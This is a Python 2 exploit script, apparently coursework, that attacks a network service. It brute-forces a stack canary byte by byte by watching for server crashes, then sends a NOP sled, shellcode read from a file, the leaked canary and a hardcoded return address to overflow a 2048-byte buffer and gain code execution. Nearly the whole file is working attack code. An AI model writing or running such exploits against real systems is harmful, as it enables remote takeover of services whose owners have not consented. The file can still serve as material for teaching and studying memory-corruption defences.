#!/usr/bin/python2
import sys
import socket
import traceback
import struct
import time

####

## This function takes your exploit code, adds a carriage-return and newline
## and sends it to the server. The server will always respond, but if the
## exploit crashed the server it will close the connection. Therefore, we try
## to write another query to the server, recv on the socket and see if we get
## an exception
##
## True means the exploit made the server close the connection (i.e. it crashed)
## False means the socket is still operational.
def try_exploit(exploit, host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send("%s\n" % exploit)
    b = 0
    while b < (len(exploit) + 1):
        mylen = len(sock.recv(4098))
        b += mylen
        if mylen == 0:
            return True
    '''
    sock.send("\n")
    return len(sock.recv(5)) == 0
    '''
    try:
        sock.send("\n")
        resp = sock.recv(5)
        return len(resp) == 0
    except:
        return True

def exploit(host, port, shellcode):
    # Build your exploit here
    # One useful function might be
    #   struct.pack("<I", x)
    # which returns the 4-byte binary encoding of the 32-bit integer x
    buf_str = "A" * 2048
    canary = ""
    next_byte = 0
    while len(canary) < 4:
        if next_byte == 10:
            next_byte += 1
            continue
        if try_exploit(buf_str + canary + chr(next_byte), host, port):
            # Connection closed by server
            next_byte += 1
            #continue
        else:
            canary += chr(next_byte)
            next_byte = 0
            # Connection still up
            #break

    for i in range(0, len(canary)):
        print ord(canary[i])

    print ':'.join(x.encode('hex') for x in canary)

    time.sleep(5)

    print len(shellcode)

    # construct query to unlink
    # \x90 = NOP
    buf_str = "\x90" * (2048 - len(shellcode)) + shellcode + canary + "A" * 12 + "\x00\xf0\xff\xbf"
    if try_exploit(buf_str, host, port):
        print "failed"
    else:
        print "success"

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    exploit(sys.argv[1], int(sys.argv[2]), shellcode)

except:
    print("Exception:")
    print(traceback.format_exc())

